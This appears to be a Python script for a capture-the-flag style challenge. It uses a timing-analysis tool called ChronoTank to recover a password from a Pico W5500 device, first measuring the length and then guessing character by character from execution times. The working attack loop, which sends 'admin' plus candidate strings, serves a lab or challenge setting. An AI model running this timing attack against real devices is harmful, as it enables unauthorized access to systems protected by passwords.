import sys
import os
import time
# Add the project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))
import random
import chronotank
import adapters.pico_w5500 as adapters
# import visualizers.live_update_plot_matplotlib as lp_mp
import visualizers.live_update_plot_plotly as lp_pl

# Initialize the adapter for the binary we're testing
adapter = adapters.pico_w5500()

# Create a ChronoTank instance with performance settings
# - batch_size: Number of measurements per input configuration
# - threads: Parallel execution threads for faster analysis
# - verbose: Whether to print detailed progress information
ch = chronotank.ChronoTank(adapter, 
                           batch_size=1,
                            threads=1, 
                            verbose=False,
                            ## only lowercase and numbers

                            alphabet="abcdefghijklmnopqrstuvwxyz0123456789",
                            save_file_name="pico_w5500_results"
                            )

# Initialize the live plotting visualization
plot = lp_pl.LiveUpdatePlot(title="ChronoTank", x_label="Input Size", y_label="Time (cycles)")
plot.show()

# Phase 1: Determine the password length by testing different input lengths
# The correct length will likely show a timing anomaly (longer execution time)
# for x in ch.find_len():
#     print("\n\n=============")
#     print(f"{len(x.input)} AVG:{x.avg}  STD:{x.STD()}")
#     # Remove statistical outliers to get cleaner results
#     without_outliers = x.remove_outliers()
#     print("Without outliers")
#     print(f"{len(x.input)} AVG:{without_outliers.avg}  STD:{without_outliers.STD()}")
#     plot.update(without_outliers)

# Based on the timing analysis, we determine the password is 12 characters long

# Phase 2: Character-by-character brute force
# For each position, we test all possible characters and measure execution time
flag = ""


# for i in range(0,12):
#     plot.clear()
#     results = []
#     # Test all possible characters at the current position
#     for x in ch.test_single_alphabet('s'+flag, 9, pad_flag=True):
#         plot.update(x)
#         results.append(x)
    
#     # The character with the highest average execution time is likely correct
#     # (because it causes the comparison to continue longer before failing)
#     max_result = max(results, key=lambda x: x.avg)
#     flag += max_result.description
#     print(f"Flag so far: {flag}")
#     input("Press Enter to continue...")


# CERT2025
min_len = 2
max_len = 16
len_times = {}

# for i in range(min_len, max_len):
#     len_times[i] = chronotank.RunResult([], i,i,i)


## randomly choose len to test in a loop
i =0
len_arr = list(range(min_len, max_len))
full_alphabet = ch.alphabet
alph_arr = list(full_alphabet)
flag = ""
while True:
    # time.sleep(0.01)
    i+=1
    char_to_test = random.choice(alph_arr)
    alph_arr.remove(char_to_test)
    if alph_arr == []:
        alph_arr = list(full_alphabet)
    ## pad to 9 chars
    padded_flag = char_to_test
    if (random.randint(0, 20) == 0):
        # print("Testing padded flag")
        padded_flag = "secret12u"
    padded_flag = "admin\r"+padded_flag.ljust(9, "A")
    # print(f"aaaa\n\n\n\nTesting padded flag: {padded_flag}")
    time.sleep(0.1)
    result = ch.run_once_batch(padded_flag,True)
    # if len_times[padded_flag] not exists in len_times:
    if padded_flag not in len_times:
        len_times[padded_flag] = chronotank.RunResult([], padded_flag,padded_flag,padded_flag)
    len_times[padded_flag].add_runs(result.runs)
    # plot.update(len_times[len_to_test])
    # print(f"Testing length {padded_flag}: {len_times[padded_flag].avg:.4f} seconds")
    if i % 100 == 0:
        plot.clear()
        for k in len_times:
            # len_times[k] = len_times[k].remove_outliers()
            plot.update(len_times[k])